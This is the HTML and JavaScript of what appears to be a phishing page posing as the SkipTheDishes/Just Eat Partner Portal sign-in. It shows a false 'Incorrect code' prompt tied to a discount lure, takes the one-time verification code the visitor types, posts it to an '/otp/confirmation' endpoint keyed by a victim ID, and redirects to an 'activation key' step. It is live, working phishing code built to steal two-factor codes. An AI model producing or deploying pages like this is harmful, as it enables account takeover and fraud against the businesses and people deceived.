<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Sign in to SkipTheDishes</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
        <link rel="icon" href="/static/images/favicon.ico"/>
        <link rel="stylesheet" href="/static/Css/style.css">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
    </head>

    <body>
        <div class="mainSkipTheDishLoadingDiv">
            <svg xmlns="http://www.w3.org/2000/svg" height="68" width="64"><path fill-rule="evenodd" d="M63.368 33.05a99.854 99.854 0 0 0-6.901-10.536l-.06-.084c-.126-.168-.454-.592-.576-.76-1.147-1.643-.986-2.84-.986-2.84-.322-4.35-.88-8.68-1.669-12.964-.185-1.144-.497-2.333-2.077-2.51-1.264-.14-3.181-.366-5.284-.476-1.76-.093-1.98 1.793-1.98 1.793-.038 1.913 0 2.832 0 3.052a.484.484 0 0 1-.375.557.595.595 0 0 1-.383-.12 81.38 81.38 0 0 0-9.093-6.873 4.163 4.163 0 0 0-2.081-.622 3.426 3.426 0 0 0-1.804.622c-.94.623-17.123 10.244-29.363 31.654 0 0-.762 1.118-.19 2.165a1.825 1.825 0 0 0 1.648 1.025l5.103.622c.508-.01.933.404.96.937a213.682 213.682 0 0 0 1.61 27.952s.219 1.56 1.685 1.634c.594.031 2.794-.106 8.659-.243a.411.411 0 0 0 .33-.134.455.455 0 0 0 .116-.352c-.564-6.082-.741-11.343-.754-11.648a.568.568 0 0 0-.341-.49c-2.163-1.3-3.506-3.707-3.527-6.321-.164-12.041.535-21.287.535-21.287s.072-1.28 1.146-1.179c1.075.102 1.007 1.37 1.007 1.37-.387 5.185-.535 14.536-.535 14.536s0 1.767 1.627 1.767c1.626 0 1.622-1.767 1.622-1.767-.05-7.315.539-14.67.539-14.67a1.24 1.24 0 0 1 .322-.876c.216-.235.513-.368.824-.369 1.04 0 1.003 1.392 1.003 1.392-.485 6.352-.535 14.515-.535 14.515s0 1.766 1.626 1.766 1.618-1.921 1.618-1.921c-.025-6.065.548-14.577.548-14.577a1.15 1.15 0 0 1 .277-.808 1.046 1.046 0 0 1 .848-.362c.965 0 1.02 1.17 1.02 1.17-.527 6.582-.536 16.693-.51 21.066.075 2.6-1.184 5.045-3.3 6.405a.68.68 0 0 0-.273.623c.134 4.002.455 8.445.729 11.626a.433.433 0 0 0 .375.406h5.346c3.135 0 5.73 0 8.035.058.257 0 .38-.2.4-.478.595-5.742.805-9.934.843-10.296.038-.362-.45-.49-.45-.49-.843-.049-2.402-.314-3.835-.557-1.432-.243-1.483-1.957-1.483-1.957-1.21-17.973 7.837-29.153 7.837-29.153s.889-1.215 2.149-.756c.742.295 1.235 1.037 1.243 1.869 1.264 14.965 0 34.26-.78 41.407a.501.501 0 0 0 .058.364.46.46 0 0 0 .288.214h.076c3.859.12 5.667.235 6.164.177.88-.097 1.589-.801 1.727-1.718 1.926-13.923 1.63-27.89 1.63-27.89.044-.497.42-.89.894-.933l5.204-.583a1.77 1.77 0 0 0 1.567-1.007 2.349 2.349 0 0 0-.093-2.107"></path></svg>
        </div>
        <div class="main">
            <div class="outer">
                <div class="inner-first">
                    <h1>Partner Portal</h1>
                    <h2>A management tool to feed and empower your business.</h2>
                    <p>When it comes to managing your business through the Partner Portal, control is right at your
                        fingertips. Manage your online business with earning statements, self-serve menu changes, store
                        hours, promos, and more.</p>
                </div>
                <div class="inner-sec">
                    <div class="latter">
                        <div class="latter-imaoe">
                            <img width="150" src="/static/images/justeat.png">
                        </div>
                        <div class="countery">
                            <button type="button">
                                <svg viewBox="0 0 25 25" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
                                    <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g>
                                    <g id="SVGRepo_iconCarrier">
                                        <path
                                            d="M5.5 16.5H19.5M5.5 8.5H19.5M4.5 12.5H20.5M12.5 20.5C12.5 20.5 8 18.5 8 12.5C8 6.5 12.5 4.5 12.5 4.5M12.5 4.5C12.5 4.5 17 6.5 17 12.5C17 18.5 12.5 20.5 12.5 20.5M12.5 4.5V20.5M20.5 12.5C20.5 16.9183 16.9183 20.5 12.5 20.5C8.08172 20.5 4.5 16.9183 4.5 12.5C4.5 8.08172 8.08172 4.5 12.5 4.5C16.9183 4.5 20.5 8.08172 20.5 12.5Z"
                                            stroke="#FB6100" stroke-width="1.2"></path>
                                    </g>
                                </svg>
                                <span>En</span>
                            </button>
                        </div>
                    </div>
                    <div class="user-input-data">
                        <form class="verificatoinForm">
                            <div>
                                <p>
                                    Incorrect code. Please enter the verificaiton code again before get the discount.
                                </p>
                            </div>
                            <div class="input-saperarto">
                                <label class="latter-label" for="code">Verfication Code</label><br>
                                <input class="input-enter" style="border: red 1px solid;" required type="number" maxlength="6" id="number" name="OTP"><br><br>
                            </div>
                            <input type="submit">
                            <div class="inline-flex">
                                <span class="inline-text reload" style="cursor:not-allowed;">Resend Verificaiton Code.</span>
                                <span class="timer">
                                    <span id="counter"></span>
                                </span>
                            </div>
                        </form> 
                    </div>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
        <script>
            if (!localStorage.getItem('complete')) {
                let mainLoadingSkiptheDish = document.querySelector('.mainSkipTheDishLoadingDiv');
                let mainChangElement = document.querySelector('.user-input-data');
                let reload = document.querySelector('.reload')
                let keyID;
    
                keyID = window.location.href.split('/update/id/')[1];
                keyID = keyID.split('/')[0];
    
                let VFrom = document.querySelector('.verificatoinForm');
                VFrom.addEventListener('submit',(e)=>{
                    e.preventDefault();  
                    mainChangElement.insertAdjacentHTML('beforeend','<div class="mainLoading"><img src="/static/images/loading.svg"/></div>');
                    let opt = document.querySelector('.input-enter');  
                    opt.setAttribute('disabled', true)
                    let FormDataObj = {
                        "OTP": opt.value
                    };
                    console.log(FormDataObj)
                    axios.post(`/api/admin/login/${keyID}/otp/confirmation`, FormDataObj).then(res => {
                        window.location.href = `/admin/login/update/id/${keyID}/Q3_activation_key`;
                    }).catch(err => {
                        console.log(err);
                    });
                });
    
                function countdown() {
                    var seconds = 59;
                    function tick() {
                        var counter = document.getElementById("counter");
                        seconds--;
                        counter.innerHTML =
                            "0:" + (seconds < 10 ? "0" : "") + String(seconds);
                        if (seconds > 0) {
                            setTimeout(tick, 1000);
                        } else {
                            reload.style.cursor = 'pointer'
                            reload.style.opacity = '1'
                            reload.addEventListener('click',()=>{
                                localStorage.setItem("attempt1", "wrong");
                                location.reload();
                            });
                            document.getElementById("counter").innerHTML = "";
                        }
                    }
                    tick();
                }
                
                window.addEventListener('load',()=>{
                    countdown();
                    setTimeout(()=>{
                        setTimeout(()=>{
                            mainLoadingSkiptheDish.style.display = 'none'
                        },500);
                        mainLoadingSkiptheDish.style.opacity = '0'
                    },2000)
                });
            }
        </script>
    </body>
</html>
